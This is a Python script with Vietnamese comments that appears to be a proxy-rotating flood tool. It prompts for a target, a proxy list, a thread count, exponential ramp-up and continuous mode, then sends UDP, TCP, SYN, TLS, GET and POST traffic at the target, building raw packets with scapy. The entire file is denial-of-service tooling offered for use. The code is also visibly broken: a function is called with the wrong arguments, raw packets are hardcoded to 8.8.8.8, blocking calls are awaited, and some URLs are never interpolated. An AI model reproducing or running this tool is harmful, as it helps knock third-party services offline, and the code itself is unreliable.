import asyncio
import requests
import time
import socket
import scapy.all as scapy
from urllib3.exceptions import MaxRetryError

requests.packages.urllib3.disable_warnings()  # tắt cảnh báo SSL


async def send_request(session, proxy_url, request):
    print(f"Sending request {request['name']} via proxy {proxy_url}")
    try:
        if request['type'] == 'udp':
            # Gửi yêu cầu UDP
            udp_packet = scapy.IP(dst="8.8.8.8") / scapy.UDP(dport=request['port']) / request['data']
            scapy.send(udp_packet, verbose=False)
        elif request['type'] == 'tcp':
            # Gửi yêu cầu TCP
            scapy.sr(scapy.IP(dst="8.8.8.8") / scapy.TCP(dport=request['port']) / request['data'], verbose=False)
        elif request['type'] == 'tls':
            # Gửi yêu cầu TLS
            await session.get(f"https://8.8.8.8:{request['port']}", verify=False)
        elif request['type'] == 'syn':
            # Gửi yêu cầu SYN
            scapy.sr(scapy.IP(dst="8.8.8.8") / scapy.TCP(dport=request['port'], flags="S"), verbose=False)
        elif request['type'] == 'get':
            # Gửi yêu cầu GET
            await session.get(request['url'])
        elif request['type'] == 'post':
        	# Gửi yêu cầu POST
            await session.post(request['url'], data=request['data'])

        print(f"Sent request {request['name']} via proxy {proxy_url}")
        return True
    except (requests.exceptions.RequestException, MaxRetryError):
        print(f"Failed to send request {request['name']} via proxy {proxy_url}")
        return False


async def send_requests(proxy_url, requests):
    session = requests.Session()
    session.proxies = {'http': proxy_url}

    success_count = 0
    tasks = []
    for request in requests:
        tasks.append(asyncio.create_task(send_request(session, proxy_url, request)))

    # Chờ tất cả các yêu cầu hoàn thành
    results = await asyncio.gather(*tasks)
    success_count = sum(results)
    return success_count

import asyncio

async def main():
    proxy_file = input('Path to file containing list of proxies: ')
    with open(proxy_file, 'r') as f:
        proxies = f.read().splitlines()

    host = input('target(default: 8.8.8.8): ')
    if not host:
        host = '8.8.8.8'

    threads = input('luồng (default: 10): ')
    if not threads:
        threads = 10
    else:
        threads = int(threads)

    chunk_size = input('1 luồng gửi số requests (default: 3): ')
    if not chunk_size:
        chunk_size = 3
    else:
        chunk_size = int(chunk_size)

    wait_time = input('thời gian chờ giữa các requests (default: 3): ')
    if not wait_time:
        wait_time = 3
    else:
        wait_time = float(wait_time)

    exponential = input('request theo cấp số nhân ? (y/n, default: n): ').lower()
    if exponential == 'y':
        exponential = True
    else:
        exponential = False

    exponential_factor = input('rate tăng requests (default: 2): ')
    if not exponential_factor:
        exponential_factor = 2
    else:
        exponential_factor = int(exponential_factor)

    continuous = input('liên tục? (y/n, default: n): ').lower()
    if continuous == 'y':
        continuous = True
    else:
        continuous = False

    # Tạo danh sách yêu cầu UDP, TCP, TLS, SYN, GET và POST
    udp_requests = [
        {
            "name": "UDP 1",
            "type": "udp",
            "data": "hello udp",
            "port": 80
        },
        {
            "name": "UDP 2",
            "type": "udp",
            "data": "world udp",
            "port": 443
        },
        {
            "name": "UDP 3",
            "type": "udp",
            "data": "test udp",
            "port": 53
        }
    ]

    tcp_requests = [
        {
            "name": "TCP 1",
            "type": "tcp",
            "data": "hello tcp",
            "port": 80
        },
        {
            "name": "TCP 2",
            "type": "tcp",
            "data": "world tcp",
            "port": 443
        },
        {
            "name": "TCP 3",
            "type": "tcp",
            "data": "test tcp",
            "port": 53
        }
    ]

    tls_requests = [
        {
            "name": "TLS 1",
            "type": "tls",
            "data": "hello tls",
            "port": 443
        },
        {
            "name": "TLS 2",
            "type": "tls",
            "data": "world tls",
            "port": 8443
        },
        {
            "name": "TLS 3",
            "type": "tls",
            "data": "test tls",
            "port": 4443
        }
    ]

    syn_requests = [
        {
            "name": "SYN 1",
            "type": "syn",
            "port": 443
        },
        {
            "name": "SYN 2",
            "type": "syn",
            "port": 80
        },
        {
            "name": "SYN 3",
            "type": "syn",
            "port": 53
        }
    ]

    get_requests = [
        {
            "name": "GET 1",
            "type": "get",
            "url": f"https://{host}/get"
        },
        {
            "name": "GET 2",
            "type": "get",
            "url": f"https://{host}"
        },
        {
            "name": "GET 3",
            "type": "get",
            "url": f"http://{host}"
        }
    ]

    post_requests = [
        {
            "name": "POST 1",
            "type": "post",
            "url": "https://{host}/post",
            "data": {"key": "value"}
        },
        {
            "name": "POST 2",
            "type": "post",
            "url": f"https://{host}/post",
            "data": {"key": "value"}
        },
        {
            "name": "POST 3",
            "type": "post",
            "url": "https://{host}/post",
            "data": {"key": "value"}
        }
    ]

    all_requests = udp_requests + tcp_requests + tls_requests + syn_requests + get_requests + post_requests

    # Chạy vòng lặp cho đến khi tất cả yêu cầu đều đã được gửi
    current_proxy = 0
    success_count = 0
    active_proxy_ports = set()
    exponential_factor = exponential_factor if exponential else 1
    current_requests = chunk_size

    while success_count < len(all_requests):
        # Lấy các yêu cầu còn lại để gửi
        remaining_requests = [r for r in all_requests if r.get("success", True)]

        # Lấy số lượng yêu cầu được gửi trong mỗi lần kết nối
        if not continuous:
            requests_per_iteration = min(current_requests, len(remaining_requests))
        else:
            requests_per_iteration = len(remaining_requests)

        # Tạo danh sách yêu cầu cần gửi
        requests_to_send = remaining_requests[:requests_per_iteration]

        # Thêm thông tin proxy vào từng yêu cầu
        for i, request in enumerate(requests_to_send):
            proxy = proxies[current_proxy]
            proxy_host, proxy_port, *_ = proxy.split(":")
            request.update({"proxy": proxy, "proxy_host": proxy_host, "proxy_port": proxy_port})
            active_proxy_ports.add(proxy_port)

        # Gửi các yêu cầu cùng lúc
        results = await asyncio.gather(*[send_request(request) for request in requests_to_send])

        # Kiểm tra kết quả của mỗi yêu cầu và đánh dấu những yêu cầu thành công
        for i, result in enumerate(results):
            if result:
                requests_to_send[i]["success"] = True
            else:
                requests_to_send[i]["success"] = False

        # Kiểm tra xem có bao nhiêu proxy đang hoạt động
        active_proxies = len(active_proxy_ports)

        # Kiểm tra xem có cần tăng tốc độ gửi yêu cầu hay không
        if exponential and current_requests < requests_per_iteration:
            current_requests *= exponential_factor

        # Chuyển sang proxy khác nếu tất cả các proxy hiện đang sử dụng không hoạt động
        if active_proxies == 0:
            print(f"All proxies in use are not working. Switching to the next proxy.")
            current_proxy = (current_proxy + 1) % len(proxies)

        # Tính toán lại số luồng cần sử dụng
        threads = min(threads, len(remaining_requests))

        # Chờ một khoảng thời gian nhất định trước khi tiếp tục gửi yêu cầu
        if not continuous:
            await asyncio.sleep(wait_time)

        # Cập nhật số lượng yêu cầu đã gửi thành công
        success_count += sum([r.get("success", False) for r in requests_to_send])

    print(f"All requests sent successfully.")

if __name__ == '__main__':
    asyncio.run(main())
